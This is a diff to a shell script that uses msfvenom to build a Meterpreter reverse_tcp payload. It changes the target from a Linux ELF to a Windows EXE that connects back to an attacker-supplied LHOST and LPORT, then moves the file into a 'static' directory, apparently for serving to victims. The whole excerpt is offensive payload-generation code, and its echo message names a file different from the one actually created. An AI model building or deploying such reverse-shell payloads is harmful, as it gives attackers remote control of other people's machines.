@@ -27,12 +27,12 @@ if [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
 fi
 
 # Generate the binary payload
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > shell.bin
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > shell_p.exe
 
 # Print a success message
-echo "Payload generated: shell.bin"
+echo "Payload generated: shell.exe"
 
-mv shell.bin static/.
+mv shell_p.exe static/.
 # Print a success message
 echo "Changed dir to: static"
 cd static
